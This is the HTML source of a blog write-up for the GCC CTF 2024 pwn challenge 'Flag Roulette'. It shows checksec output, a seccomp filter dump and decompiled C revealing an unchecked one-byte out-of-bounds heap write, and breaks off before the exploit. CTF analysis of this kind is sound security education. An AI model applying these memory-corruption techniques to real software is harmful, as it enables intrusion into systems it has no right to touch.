@@ -1,0 +1,1109 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>GCC CTF 2024 - Chovid99&#39;s Blog</title><meta name="Description" content="Security&#39;s blog made by Chovid99"><meta property="og:title" content="GCC CTF 2024" />
+<meta property="og:description" content="Writeup for GCC CTF 2024 by Chovid99" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://chovid99.github.io/posts/gcc-ctf-2024/" /><meta property="og:image" content="https://chovid99.github.io/C99-web-card.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-03-04T08:21:14+07:00" />
+<meta property="article:modified_time" content="2024-03-05T22:17:04+08:00" /><meta property="og:site_name" content="Welcome to Chovid99&#39;s Blog" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://chovid99.github.io/C99-web-card.png" /><meta name="twitter:title" content="GCC CTF 2024"/>
+<meta name="twitter:description" content="Writeup for GCC CTF 2024 by Chovid99"/>
+<meta name="twitter:site" content="@Chovid99"/>
+<meta name="application-name" content="Chovid99&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Chovid99&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://chovid99.github.io/posts/gcc-ctf-2024/" /><link rel="prev" href="https://chovid99.github.io/posts/dicectf-2024-quals/" /><link rel="next" href="https://chovid99.github.io/posts/cyber-apocalypse-2024-pwn/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="9bWYU2tJlhINPHANaxcXkK63aSnxvqj7GHrr_r5tb9s" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "GCC CTF 2024",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/chovid99.github.io\/posts\/gcc-ctf-2024\/"
+        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, GCC CTF, heap, mmap, tls dtor, 2024","wordcount":  3066 ,
+        "url": "https:\/\/chovid99.github.io\/posts\/gcc-ctf-2024\/","datePublished": "2024-03-04T08:21:14+07:00","dateModified": "2024-03-05T22:17:04+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
+                "@type": "Person",
+                "name": "Chovid99"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
+            <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                
+                
+            </a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/" title="Check my Home"> Home </a><a class="menu-item" href="/posts/" title="Check my posts"> Posts </a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags"> Tags </a><a class="menu-item" href="/about/" title="Know more about me"> About </a><span class="menu-item delimiter"></span></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
+                <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Check my Home">Home</a><a class="menu-item" href="/posts/" title="Check my posts">Posts</a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags">Tags</a><a class="menu-item" href="/about/" title="Know more about me">About</a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">GCC CTF 2024</h1><div class="post-meta">
+            <div class="post-meta-line">
+                </div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Mar 04, 2024">Mar 04, 2024</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;3066 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;15 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#pwn">Pwn</a>
+      <ul>
+        <li><a href="#flag-roulette">Flag Roulette</a>
+          <ul>
+            <li><a href="#initial-analysis">Initial Analysis</a></li>
+            <li><a href="#solution">Solution</a>
+              <ul>
+                <li><a href="#getting-libc-leak">Getting libc leak</a></li>
+                <li><a href="#stack-pivot-via-tls-dtor">Stack Pivot via TLS DTOR</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#social-media">Social Media</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><figure><a class="lightgallery" href="https://i.imgur.com/lEppMvR.png" title="https://i.imgur.com/lEppMvR.png" data-thumbnail="https://i.imgur.com/lEppMvR.png" data-sub-html="<h2>GCC CTF 2024</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://i.imgur.com/lEppMvR.png"
+            data-srcset="https://i.imgur.com/lEppMvR.png, https://i.imgur.com/lEppMvR.png 1.5x, https://i.imgur.com/lEppMvR.png 2x"
+            data-sizes="auto"
+            alt="https://i.imgur.com/lEppMvR.png" />
+    </a><figcaption class="image-caption">GCC CTF 2024</figcaption>
+    </figure>
+<p>I spent some of my free time to do the GCC CTF 2024. Below is my write-up for the last pwn challenge called <code>Flag Roulette</code>.</p>
+<h1 id="pwn">Pwn</h1>
+<h2 id="flag-roulette">Flag Roulette</h2>
+<div class="details admonition quote open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>Are you tired of solving challs?</p>
+<p>Here, have a little break. If we win my game, I will give you a flag.</p>
+<p>I promise you I will not cheat :)</p>
+<p>The flag is in the /flag file.</p>
+<p>Author: 0xdeadbeef</p>
+</div>
+        </div>
+    </div>
+<h3 id="initial-analysis">Initial Analysis</h3>
+<p>In this challenge, we were provided a binary file named <code>flag_roulette</code> along with the supporting libraries <code>libc</code>, <code>ld</code>, and <code>libseccomp</code>. These libraries are essential for the binary&rsquo;s execution. Let&rsquo;s begin by examining the security mitigations implemented within the binary itself.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    Arch:     amd64-64-little
+</span></span><span class="line"><span class="cl">    RELRO:    Full RELRO
+</span></span><span class="line"><span class="cl">    Stack:    Canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      PIE enabled
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>All security mitigations appear to be active, including the provision of the <code>libseccomp</code> file, indicating the application of a seccomp filter in the binary. Our next step involves attempting to dump this filter.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">seccomp</span><span class="o">-</span><span class="n">tools</span> <span class="n">dump</span> <span class="o">./</span><span class="n">flag_roulette_patched</span>
+</span></span><span class="line"><span class="cl"> <span class="n">line</span>  <span class="n">CODE</span>  <span class="n">JT</span>   <span class="n">JF</span>      <span class="n">K</span>
+</span></span><span class="line"><span class="cl"><span class="o">=================================</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">0000</span><span class="p">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000004</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">arch</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">0001</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x0b</span> <span class="mh">0xc000003e</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">ARCH_X86_64</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0013</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">0002</span><span class="p">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">sys_number</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">0003</span><span class="p">:</span> <span class="mh">0x35</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x40000000</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">&lt;</span> <span class="mh">0x40000000</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0005</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">0004</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x08</span> <span class="mh">0xffffffff</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0013</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">0005</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">read</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0012</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">0006</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x05</span> <span class="mh">0x00</span> <span class="mh">0x00000001</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">write</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0012</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">0007</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x04</span> <span class="mh">0x00</span> <span class="mh">0x00000002</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">open</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0012</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">0008</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x03</span> <span class="mh">0x00</span> <span class="mh">0x00000003</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">close</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0012</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">0009</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x02</span> <span class="mh">0x00</span> <span class="mh">0x00000009</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">mmap</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0012</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">0010</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x01</span> <span class="mh">0x00</span> <span class="mh">0x0000000b</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">munmap</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0012</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">0011</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x0000003c</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">exit</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0013</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">0012</span><span class="p">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">0013</span><span class="p">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="k">return</span> <span class="n">KILL</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Our options for code execution are limited to the traditional open-read-write strategy. We proceed by disassembling the binary to examine its key functions.</p>
+<p><strong>main</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-24h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">has_a_bet</span><span class="p">;</span> <span class="c1">// [rsp+Dh] [rbp-23h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+Eh] [rbp-22h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+Fh] [rbp-21h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-20h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// [rsp+14h] [rbp-1Ch] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">j</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-18h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">k</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-14h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">void</span> <span class="o">*</span><span class="n">bet</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-10h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v12</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">v12</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">banner</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">has_a_bet</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">menu</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">      <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v6</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="nf">getchar</span><span class="p">();</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">10</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="nf">getchar</span><span class="p">()</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">while</span> <span class="p">(</span> <span class="n">v6</span> <span class="o">!=</span> <span class="mi">10</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">v6</span> <span class="o">=</span> <span class="nf">getchar</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">i</span> <span class="o">==</span> <span class="sc">&#39;3&#39;</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="sc">&#39;3&#39;</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="n">i</span> <span class="o">==</span> <span class="sc">&#39;1&#39;</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span> <span class="n">has_a_bet</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">          <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;You already have a bet placed&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="cl">          <span class="k">else</span>
+</span></span><span class="line"><span class="cl">          <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;How many bytes would you like to bet on ?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;&gt; &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%ud&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v8</span> <span class="o">&gt;</span> <span class="mi">127</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">              <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v8</span> <span class="o">&lt;=</span> <span class="mi">135168</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">              <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">bet</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">v8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">v8</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                  <span class="k">do</span>
+</span></span><span class="line"><span class="cl">                  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">do</span>
+</span></span><span class="line"><span class="cl">                      <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">bet</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span> <span class="o">=</span> <span class="nf">rand</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">while</span> <span class="p">(</span> <span class="o">*</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">bet</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">31</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">                  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                  <span class="k">while</span> <span class="p">(</span> <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">bet</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span> <span class="o">==</span> <span class="mi">127</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Random pattern generated successfully&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">As a sign of good will, we will let you modify set exactly one byte in this sea of randomness&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Please choose the index of the byte to modify&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;&gt; &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%ud&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v7</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Please set the new value of this byte&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;&gt; &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%ud&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">bet</span> <span class="o">+</span> <span class="n">v7</span><span class="p">)</span> <span class="o">=</span> <span class="n">v3</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Modification successful&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">has_a_bet</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">              <span class="p">}</span>
+</span></span><span class="line"><span class="cl">              <span class="k">else</span>
+</span></span><span class="line"><span class="cl">              <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Come on, you cannot be THAT lucky ;)&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">              <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">              <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Not enough bytes&#34;</span><span class="p">);</span>
